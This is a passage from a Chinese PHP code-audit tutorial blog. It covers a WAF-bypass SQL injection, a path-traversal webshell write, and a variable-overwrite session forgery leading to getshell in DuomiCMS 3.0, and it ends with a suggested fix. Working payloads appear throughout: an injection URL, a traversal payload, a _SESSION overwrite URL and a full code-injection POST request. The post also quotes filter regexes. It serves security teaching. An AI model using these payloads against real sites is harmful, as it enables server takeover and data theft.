<li>前面我们介绍了，如果参数相同的情况下，默认 <strong>第二个参数传入的值</strong> 会覆盖 <strong>第一个参数传入的值</strong> 。因此此时在第一个WAF中 <strong>i_d&#x3D;123</strong> ，不存在其他特殊的字符，因此绕过了第一个WAF。</li>
<li>当数据流到达进入到第二个WAF时，由于代码是通过 <strong>$_SERVER[‘REQUEST_URI’]</strong> 取参数，而我们前面开头的第三个知识点已经介绍过了 <strong>$_SERVER[‘REQUEST_URI’]</strong> 是不会将参数中的特殊符号进行转换，因此这里的 <strong>i.d</strong> 参数并不会被替换为 <strong>i_d</strong> ，所以此时正常来说 <strong>i.d</strong> 和 <strong>i_d</strong> 都能经过第二个WAF。</li>
<li>第二个WAF中有一个 <strong>dhtmlspecialchars()</strong> 函数，这里需要绕过它，其实很好绕过。绕过之后 <strong>i_d&#x3D;payload&amp;i.d&#x3D;123</strong> 便会进入到业务层代码中，执行SQL语句，由于这里的SQL语句采用拼接的方式，因此存在SQL注入。</li>
</ul>
<p>因此最后payload如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/index.php?submit=&amp;i_d=-1/**/union/**/select/**/1,flag,3,4/**/from/**/ctf.users&amp;i.d=123</span></span><br></pre></td></tr></table></figure>

<p>参考文章<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011721501/article/details/51824576">PHP的两个特性导致waf绕过注入</a><br><a target="_blank" rel="noopener" href="https://blog.spoock.com/2018/05/05/request-vuln-analysis/">request导致的安全性问题分析</a> </p>
<h2 id="Day-14-Snowman"><a href="#Day-14-Snowman" class="headerlink" title="Day 14 - Snowman"></a>Day 14 - Snowman</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Carrot</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">EXTERNAL_DIRECTORY</span> = <span class="string">&#x27;/tmp/&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lost</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$bought</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;id = <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$field</span> =&gt; <span class="variable">$count</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="variable">$field</span> = <span class="variable">$count</span>++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable constant_">EXTERNAL_DIRECTORY</span> . <span class="variable">$this</span>-&gt;id,</span><br><span class="line">            <span class="title function_ invoke__">var_export</span>(<span class="title function_ invoke__">get_object_vars</span>(<span class="variable">$this</span>), <span class="literal">true</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$carrot</span> = <span class="keyword">new</span> <span class="title class_">Carrot</span>(<span class="variable">$_GET</span>);</span><br></pre></td></tr></table></figure>
<p><strong>漏洞解析</strong> ：</p>
<p>这道题目讲的是一个 <strong>变量覆盖</strong> 与 <strong>路径穿越</strong> 问题。在 <strong>第10-11行</strong> 处， <strong>Carrot</strong> 类的构造方法将超全局数组 <strong>$_GET</strong> 进行变量注册，这样即可覆盖 <strong>第8行</strong> 已定义的 <strong>$this-&gt;</strong> 变量。而在 <strong>第16行</strong> 处的析构函数中， <strong>file_put_contents</strong> 函数的第一个参数又是由 <strong>$this-&gt;</strong> 变量拼接的，这就导致我们可以控制写入文件的位置，最终造成任意文件写入问题。下面我们试着使用 <strong>payload</strong> ：<strong>id&#x3D;..&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&amp;shell&#x3D;’,)%0a<?php phpinfo();?>&#x2F;&#x2F;</strong> 写入 <strong>webshell</strong> ：</p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-25.png"></p>
<h3 id="实例分析-2"><a href="#实例分析-2" class="headerlink" title="实例分析"></a>实例分析</h3><p>本次实例分析，我们选取的是 <strong><a target="_blank" rel="noopener" href="https://duomicms.net/">DuomiCMS_3.0</a></strong> 最新版。该CMS存在全局变量注册问题，如果程序编写不当，会导致变量覆盖，本次我们便来分析 <strong>由变量覆盖导致的getshell</strong> 问题。</p>
<p>首先我们先来看一下该CMS中的全局变量注册代码，该代码位于 <strong>duomiphp&#x2F;common.php</strong> 文件中，如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="title function_ invoke__">Array</span>(<span class="string">&#x27;_GET&#x27;</span>, <span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>) $&#123;<span class="variable">$_k</span>&#125; = <span class="title function_ invoke__">_RunMagicQuotes</span>(<span class="variable">$_v</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_RunMagicQuotes</span>(<span class="params">&amp;<span class="variable">$svar</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$svar</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$svar</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>) <span class="variable">$svar</span>[<span class="variable">$_k</span>] = <span class="title function_ invoke__">_RunMagicQuotes</span>(<span class="variable">$_v</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$svar</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$svar</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$svar</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 <strong>_RunMagicQuotes</strong> 函数将特殊符号，使用 <strong>addslashes</strong> 函数进行转义处理。我们来搜索 <strong>fwrite</strong> 函数，看看是否存在可利用的写文件程序（为了写 <strong>shell</strong> ）。<strong>phpstorm</strong> 程序搜索结果如下：</p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-26.png"></p>
<p>我们可以看到有一个 <strong>admin\admin_ping.php</strong> 文件中，存在可利用的地方，因为其写入的目标文件为 <strong>PHP</strong> 程序，且写入内容中存在两个可控变量。其代码具体如下：</p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-27.png"></p>
<p><strong>$weburl</strong> 变量和 <strong>$token</strong> 变量从 <strong>POST方式</strong> 获取，其变量也只是经过 <strong>_RunMagicQuotes</strong> 函数过滤处理，以及 <strong>duomiphp\webscan.php</strong> 文件的过滤规则，但是并不影响我们写shell。过滤规则具体如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$getfilter</span> = <span class="string">&quot;\\k.+javascript:window\\[.*\\]|&lt;.*(&amp;#\\d+;)+?&gt;|&lt;.*(data|src)=data:text\\html.*?&gt;|\\b(alert\\|confirm\\|expression\\|prompt\\|benchmark.*|sleep.*|group.*)\\b(load_file|benchmark|[a-z]&#123;4,&#125;)\\b|\\bon\\w+=[^&gt;]+\\&gt;|SELECT\\s+(.*.)+\\b@&#123;1,2&#125;\\s+.*|SET\\s+.*\\b;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$postfilter</span> = <span class="string">&quot;&lt;.*=&amp;(#\\d+;)+?&gt;.*\\b(alert\\|confirm\\|expression\\|prompt\\|benchmark.*|sleep.*|group.*)\\b(load_file|benchmark)\\b|\\bon\\w+=[^&gt;]+\\&gt;|\\bEXEC\\b|UNION\\s+SELECT.*|INSERT\\s+INTO.*VALUES\\s*(\\(.*)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cookiefilter</span> = <span class="string">&quot;benchmark.*|\\b(load_file|exec|SELECT|INSERT|DELETE|CREATE|ALTER|DROP|TRUNCATE|\\@@)\\b.*?VALUES\\(.*|SET\\s+.*&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>然而要想利用这个文件，我们就必须是 <strong>admin</strong> 身份，不然没有权限访问该文件。所以我们看看该CMS是如何对用户身份进行认定的，是否可以利用之前的变量覆盖来伪造身份呢？</p>
<p>跟进 <strong>admin\admin_ping.php</strong> 文件开头包含的 <strong>admin\config.php</strong> 文件，那么我们要关注的是如下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(duomi_INC . <span class="string">&quot;/check.admin.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cuserLogin</span> = <span class="keyword">new</span> <span class="title function_ invoke__">userLogin</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$cuserLogin</span>-&gt;<span class="title function_ invoke__">getUserID</span>() === -<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php?gotoPage=&quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="variable">$EkNowurl</span>));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们需要知道程序是如何对用户的身份进行处理的，跟进 <strong>duomiphp\check.admin.php</strong> 文件，关注如下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">userLogin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$userName</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$userPwd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$userID</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$adminDir</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$groupid</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$keepUserIDTag</span> = <span class="string">&quot;duomi_admin_id&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$keepgroupidTag</span> = <span class="string">&quot;duomi_group_id&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$keepUserNameTag</span> = <span class="string">&quot;duomi_admin_name&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$admindir</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$admin_path</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable language_">$this</span>-&gt;keepUserIDTag]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;userID = <span class="variable">$_SESSION</span>[<span class="variable language_">$this</span>-&gt;keepUserIDTag];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;groupid = <span class="variable">$_SESSION</span>[<span class="variable language_">$this</span>-&gt;keepgroupidTag];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;userName = <span class="variable">$_SESSION</span>[<span class="variable language_">$this</span>-&gt;keepUserNameTag];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到这里记录了用户名字、所属组、用户，再来看看 <strong>admin</strong> 所对应的这三个值分别是多少。找到 <strong>admin\login.php</strong> 文件，如下图，我们只要让 <strong>checkUser</strong> 方法返回1即是admin用户。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$dopost</span>==<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$validate</span> = <span class="keyword">empty</span>(<span class="variable">$validate</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$validate</span>));</span><br><span class="line">    <span class="variable">$svali</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">GetCkVdValue</span>());</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$validate</span>==<span class="string">&#x27;&#x27;</span> || <span class="variable">$svali</span> != <span class="variable">$svali</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">ResetVdValue</span>();</span><br><span class="line">        <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&#x27;验证码不正确！&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$cuserLogin</span> = <span class="keyword">new</span> <span class="title function_ invoke__">userLogin</span>(<span class="variable">$admindir</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$userid</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$pwd</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable">$cuserLogin</span>-&gt;<span class="title function_ invoke__">checkUser</span>(<span class="variable">$userid</span>, <span class="variable">$pwd</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$cuserLogin</span>-&gt;<span class="title function_ invoke__">keepUser</span>();</span><br><span class="line">                <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$gotopage</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&#x27;成功登录，正在转向管理管理页！&#x27;</span>, <span class="variable">$gotopage</span>);</span><br><span class="line">                    <span class="keyword">exit</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&#x27;登录失败，正在转向管理管理页！&#x27;</span>, <span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进 <strong>duomiphp\check.admin.php</strong> 文件的 <strong>checkUser</strong> 方法，具体代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkUser</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$userpwd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$dsql</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;userName = <span class="title function_ invoke__">m_ereg_replace</span>(<span class="string">&quot;[^0-9a-zA-Z_@!\.-]&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;userPwd = <span class="title function_ invoke__">m_ereg_replace</span>(<span class="string">&quot;[^0-9a-zA-Z_@!\.-]&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$userpwd</span>);</span><br><span class="line">    <span class="variable">$pwd</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;userPwd),<span class="number">5</span>,<span class="number">20</span>);</span><br><span class="line">    <span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">SetQuery</span>(<span class="string">&quot;Select * From duomi_admin where name like &#x27;&quot;</span>.<span class="variable">$this</span>-&gt;userName.<span class="string">&quot;&#x27; and state=&#x27;1&#x27; limit 0,1&quot;</span>);</span><br><span class="line">    <span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">Execute</span>();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">GetObject</span>();</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$row</span>-&gt;password))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$pwd</span>!=<span class="variable">$row</span>-&gt;password)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$loginip</span> = <span class="title function_ invoke__">GetIP</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;userID = <span class="variable">$row</span>-&gt;id;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;groupid = <span class="variable">$row</span>-&gt;groupid;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;userName = <span class="variable">$row</span>-&gt;name;</span><br><span class="line">        <span class="variable">$inquery</span> = <span class="string">&quot;update duomi_admin set loginip=&#x27;<span class="subst">$loginip</span>&#x27;,logintime=&#x27;&quot;</span>.<span class="title function_ invoke__">time</span>().<span class="string">&quot;&#x27; where id=&#x27;&quot;</span>.<span class="variable">$row</span>-&gt;id.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">ExecuteNoneQuery</span>(<span class="variable">$inquery</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们直接使用正确admin账号密码登录后台，可以观察到admin用户对应的用户和所属组均为1。</p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-28.png"></p>
<p>那么现在我们只要利用变量覆盖漏洞，覆盖 <strong>session</strong> 的值，从而伪造 <strong>admin</strong> 身份，然后就可以愉快的写shell了。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>我们需要先找一些开启 <strong>session_start</strong> 函数的程序来辅助我们伪造身份，我们这里就选择 <strong>member&#x2F;share.php</strong> 文件。</p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-29.png"></p>
<p>我们先访问如下 <strong>payload</strong> ：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/member/share.php?_SESSION[duomi_group_]=1&amp;_SESSION[duomi_admin_]=1</span></span><br></pre></td></tr></table></figure>

<p>当我们访问 <strong>payload</strong> 后，我们对应 <strong>session</strong> 的用户和所属组都变成了1。然后，我们再POST如下数据包写入webshell：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/admin_ping.php?action=set</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.localhost.com</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>34</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">weburl</span><span class="operator">=</span><span class="string">&quot;;phpinfo();//&amp;token=</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-30.png"></p>
<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>实际上，这个漏洞和 <strong>Dedecms</strong> 变量覆盖漏洞很相似。而在 <strong>Dedecms</strong> 的官方修复代码中，多了检测变量名是否为PHP原有的超全局数组，如果是，则直接退出并告知变量不允许，具体修复代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_RunMagicQuotes</span>(<span class="params">&amp;<span class="variable">$svar</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$svar</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$svar</span> <span class="keyword">as</span> <span class="variable">$s_k</span> =&gt; <span class="variable">$s_v</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$svar</span>[<span class="variable">$s_k</span>] = <span class="title function_ invoke__">_RunMagicQuotes</span>(<span class="variable">$s_v</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$svar</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#&#x27;</span>, <span class="variable">$svar</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&#x27;Request var not allow!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$svar</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$svar</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$svar</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/categories/">Categories</a></li>
        
          <li><a href="/idea/">Idea</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
